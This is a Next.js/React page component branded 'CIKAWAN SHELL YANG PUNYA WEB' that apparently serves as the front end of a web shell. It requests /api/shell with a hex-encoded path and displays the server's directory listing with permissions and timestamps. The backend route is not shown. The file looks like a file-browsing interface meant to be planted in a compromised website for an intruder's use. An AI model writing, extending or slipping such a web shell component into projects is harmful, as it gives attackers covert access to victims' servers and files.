'use client';

import { useEffect, useState, FormEvent } from "react";

type FileItem = {
    name: string;
    path: string;
    type: "d" | "f";
    size: number;
    perms: string;
    modified: string;
};

export default function CikawanShell() {
    const [items, setItems] = useState<FileItem[]>([]);
    const [path, setPath] = useState<string>("/");
    const [loading, setLoading] = useState<boolean>(false);

    const fetchFiles = async (hexPath = ""): Promise<void> => {
        setLoading(true);
        try {
            const res = await fetch(`/api/shell?p=${hexPath}`);
            const data = await res.json();
            setItems(data.items || []);
            setPath(data.path || "/");
        } catch (err) {
            console.error("Failed to fetch files:", err);
        } finally {
            setLoading(false);
        }
    };
    useEffect(() => {
        fetchFiles();
    }, []);

    const formatSize = (size: number) =>
        size > 1024 * 1024
            ? `${(size / 1024 / 1024).toFixed(2)} MB`
            : size > 1024
                ? `${(size / 1024).toFixed(2)} KB`
                : `${size} B`;

    return (
        <div className="min-h-screen bg-gray-900 text-gray-100 font-mono p-6 relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-tr from-purple-900 via-gray-900 to-black opacity-50 animate-pulse -z-10"></div>
            <header className="text-center mb-6">
                <h1 className="text-4xl font-extrabold text-purple-400 drop-shadow-lg mb-2 animate-pulse">
                    CIKAWAN SHELL YANG PUNYA WEB
                </h1>
                <p className="text-gray-400 italic">~ King Meledak Mode ~</p>
                <p className="text-sm text-green-400 mt-1">Current path: <span className="text-purple-300">{path}</span></p>
            </header>
            {loading ? (
                <div className="text-center text-green-400 animate-pulse">Loading files...</div>
            ) : (
                <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse bg-gray-800 rounded-lg shadow-lg border border-purple-700">
                        <thead>
                            <tr className="border-b border-purple-700 text-purple-300">
                                <th className="p-3">Name</th>
                                <th className="p-3">Size</th>
                                <th className="p-3">Perms</th>
                                <th className="p-3">Modified</th>
                            </tr>
                        </thead>
                        <tbody>
                            {items.map((item) => (
                                <tr
                                    key={item.path}
                                    className="hover:bg-gray-700 hover:text-green-400 transition-all duration-200 cursor-pointer"
                                >
                                    <td className="p-2">
                                        {item.type === "d" ? "📁" : "📄"} {item.name}
                                    </td>
                                    <td className="p-2">{formatSize(item.size)}</td>
                                    <td className="p-2">{item.perms}</td>
                                    <td className="p-2">
                                        {new Date(item.modified).toLocaleString()}
                                    </td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                </div>
            )}
        </div>
    );
}
